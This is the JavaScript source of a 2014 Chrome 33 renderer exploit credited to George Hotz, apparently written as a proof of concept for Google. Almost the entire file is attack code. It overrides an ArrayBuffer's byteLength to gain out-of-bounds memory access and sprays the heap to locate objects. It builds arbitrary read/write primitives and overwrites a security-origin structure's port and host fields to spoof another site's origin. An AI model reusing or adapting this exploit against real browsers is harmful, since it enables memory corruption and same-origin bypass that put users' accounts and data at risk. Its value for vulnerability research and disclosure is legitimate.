/* chrome 33 renderer exploit
 * copyright 2014 George Hotz
 * remember, this code is for Google
 * don't write shit
 */

function hex(a) {
	if (a == undefined) return "0xUNDEFINED";
	if (a < 0) a = 0xFFFFFFFF + a + 1;
	var ret = a.toString(16);
	if (ret.substr(0,2) != "0x") return "0x"+ret;
	else return ret;
}

function log(s) {
	var log = document.getElementById("log");
	var ele = document.createElement("span");
	console.log(s);
	ele.innerHTML = s;
	log.appendChild(ele);
	log.appendChild(document.createElement("br"));
}

function exploit()
{

	faulty_arr_buf = new ArrayBuffer(0x100);
	faulty_arr_buf.__defineGetter__("byteLength", function() { return 0xFFFFFFFC; });
	faulty_arr = new Uint32Array(faulty_arr_buf);

	spray_array = new Array(0x1000);
	elements = new Array(0x250);
	for (var i = 0 ; i < spray_array.length ; i++) 
	{
		if (i == 0x500)
		{
			alert("allocating vuln object")
				//            faulty_arr_buf = new
				//            ArrayBuffer(0x1f8);
				attribute_string1 = unescape("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
			attribute_string = unescape("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
		}
		spray_array[i] =
			new
			Uint32Array(0x100/4);
		for (var j =
				0; j <
				spray_array[i].length
				; j++ )
		{
			spray_array[i][j]
				=
				0x41414141;
		}
	}
	for (var i = 0 ; i < elements.length ; i++) 
	{
		elements[i] = document.createElement("div");
		for (var j = 0 ; j < 0x100 ; j ++)
		{
			elements[i].setAttribute("elem" + j,
					attribute_string);
		}
	}
	var address_list = {};
	for (var i = 0 ; i < 0x200 ; i++)
	{
		//addr = 0x001f8
		addr = 0x200000 + 0x80000
			if ((faulty_arr[(addr - 0x1f8)/4 + i].toString(16) in
						address_list) == false)
			{
				address_list[faulty_arr[(addr -
						0x1f8)/4 + i].toString(16)] = 0;
			}
		address_list[faulty_arr[(addr
				- 0x1f8)/4 + i].toString(16)] +=
			1;
	}
	max_val = 0;
	max_key = NaN;
	for (var key in address_list)
	{
		//LOG("a:" + hex(key) + ":" + address_list[key]);
		if (address_list[key] > max_val)
		{
			max_val = address_list[key];
			max_key = key
		}
	}

	var string_address = parseInt("0x" + max_key);

	alert("search");
	var string_start_index = 0;
	/* scan for the relative offset of the string (i is the amount of
	 * dwords forward) */
	for (i = 0 ; i < 0xFFFFFFFC/4 ; i++)
	{
		if (faulty_arr[i] == 0x61616161)
		{   
			string_start_index = i;
			break;
		}
	}
	/* Now use the absolute string address to calculate the absolute
	 * address of our buffer */
	log("offset:" + string_start_index*4);
	log(hex(string_address));
	base = string_address - string_start_index*4 + 12;
	log(hex(base));
	alert('found');

	function read32(addr)
	{
		diff = addr - base;
		index = diff/4;
		return faulty_arr[index];
	}

	function write32(addr, value)
	{
		diff = addr - base;
		index = diff/4;
		faulty_arr[index] = value;
	}

	// var heap_base = 0x83da0000
	//var heap_base = 0xf9504000;
	var heap_base = 0xb8ae5000

		for (var x=0; x< 0x43f000; x+=4)
		{
			if (read32(heap_base+x)==1)
			{
				var a = read32(heap_base+x+2*4);
				var aa = read32(heap_base+x+3*4);
				if (a==aa && a!=0)
				{
					var c = read32(heap_base+x+4*4);
					var cc = read32(heap_base+x+5*4);
					var ccc = read32(heap_base+x+6*4);
					if (c == ccc && ccc ==0 && cc == 0x1f40)
					{
						var d = read32(heap_base+x+7*4);
						if (d==0x1c)
						{
							log('aa:'+hex(heap_base+x));
							write32(heap_base+x+5*4, 0x01000000);
						}
					}
				}
			}
		}

	log('finished');
}


function exploit_host_port_protocol()
{

	faulty_arr_buf = new ArrayBuffer(0x100);
	faulty_arr_buf.__defineGetter__("byteLength", function() { return 0xFFFFFFFC; });
	faulty_arr = new Uint32Array(faulty_arr_buf);

	spray_array = new Array(0x1000);
	elements = new Array(0x250);
	for (var i = 0 ; i < spray_array.length ; i++) 
	{
		if (i == 0x500)
		{
			alert("allocating vuln object")
				//            faulty_arr_buf = new
				//            ArrayBuffer(0x1f8);
				attribute_string1 = unescape("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
			attribute_string = unescape("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
		}
		spray_array[i] =
			new
			Uint32Array(0x100/4);
		for (var j =
				0; j <
				spray_array[i].length
				; j++ )
		{
			spray_array[i][j]
				=
				0x41414141;
		}
	}
	for (var i = 0 ; i < elements.length ; i++) 
	{
		elements[i] = document.createElement("div");
		for (var j = 0 ; j < 0x100 ; j ++)
		{
			elements[i].setAttribute("elem" + j,
					attribute_string);
		}
	}
	var address_list = {};
	for (var i = 0 ; i < 0x200 ; i++)
	{
		//addr = 0x001f8
		addr = 0x200000 + 0x80000
			if ((faulty_arr[(addr - 0x1f8)/4 + i].toString(16) in
						address_list) == false)
			{
				address_list[faulty_arr[(addr -
						0x1f8)/4 + i].toString(16)] = 0;
			}
		address_list[faulty_arr[(addr
				- 0x1f8)/4 + i].toString(16)] +=
			1;
	}
	max_val = 0;
	max_key = NaN;
	for (var key in address_list)
	{
		//LOG("a:" + hex(key) + ":" + address_list[key]);
		if (address_list[key] > max_val)
		{
			max_val = address_list[key];
			max_key = key
		}
	}

	var string_address = parseInt("0x" + max_key);

	alert("search");
	var string_start_index = 0;
	/* scan for the relative offset of the string (i is the amount of
	 * dwords forward) */
	for (i = 0 ; i < 0xFFFFFFFC/4 ; i++)
	{
		if (faulty_arr[i] == 0x61616161)
		{   
			string_start_index = i;
			break;
		}
	}
	/* Now use the absolute string address to calculate the absolute
	 * address of our buffer */
	log("offset:" + string_start_index*4);
	log(hex(string_address));
	base = string_address - string_start_index*4 + 12;
	log(hex(base));
	alert('found');

	function read32(addr)
	{
		diff = addr - base;
		index = diff/4;
		return faulty_arr[index];
	}

	function write32(addr, value)
	{
		diff = addr - base;
		index = diff/4;
		faulty_arr[index] = value;
	}

	// var heap_base = 0x83da0000
	//var heap_base = 0xf9504000;
	//var heap_base = 0xb81c0000
	var heap_base = 0xb7d61000

		for (var x=0; x< 0x45f000; x+=4)
		{
			if (read32(heap_base+x)==1)
			{
				var a = read32(heap_base+x+2*4);
				var aa = read32(heap_base+x+3*4);
				if (a==aa && a!=0)
				{
					var c = read32(heap_base+x+4*4);
					var cc = read32(heap_base+x+5*4);
					var ccc = read32(heap_base+x+6*4);
					if (c == ccc && ccc ==0 && cc == 0x1f40)
					{
						var d = read32(heap_base+x+7*4);
						if (d==0x1c)
						{
							log('aa:'+hex(heap_base+x));
							/*write32(heap_base+x+5*4, 0x01000000);*/

							/* change port to 0 */
							var port = read32(heap_base + x + 5 * 4);
							port = port & 0xffff0000;
							write32(heap_base + x + 5 * 4, port);

							/* change m_protocol */
							/*var mprotocolstring = read32(heap_base + x + 1 * 4);
							  log('protocol address: ' + mprotocolstring);
							  write32(mprotocolstring + 4, 5);
							  var protocol_length = read32(mprotocolstring + 4);
							  log('protocol length after write: ' + protocol_length);
							  write32(mprotocolstring + 12, 0x70747468);
							  var protocol_length = read32(mprotocolstring + 12);
							  log('protocol length after write: ' + hex(protocol_length));
							  write32(mprotocolstring + 16, 0x00000073);
							  var protocol_length = read32(mprotocolstring + 16);
							  log('protocol length after write: ' + hex(protocol_length));*/

							/* change m_host */
							var mhoststring = read32(heap_base + x + 2 * 4);
							log('host address: ' + mhoststring);
							write32(mhoststring + 4, 17);
							write32(mhoststring + 12, 0x2e777777);
							/*write32(mhoststring + 16, 0x676f6f67);
							  write32(mhoststring + 20, 0x632e656c);
							  write32(mhoststring + 24, 0x732e6d6f);
							  write32(mhoststring + 28, 0x00000067);*/
							/*write32(mhoststring + 16, 0x706d6f63);
							  write32(mhoststring + 20, 0x73756e2e);
							  write32(mhoststring + 24, 0x7564652e);
							  write32(mhoststring + 28, 0x0067732e);*/
							write32(mhoststring + 16, 0x64696162);
							write32(mhoststring + 20, 0x6f632e75);
							write32(mhoststring + 24, 0x0000006d);
						}
					}
				}
			}
		}

	log('finished');
}


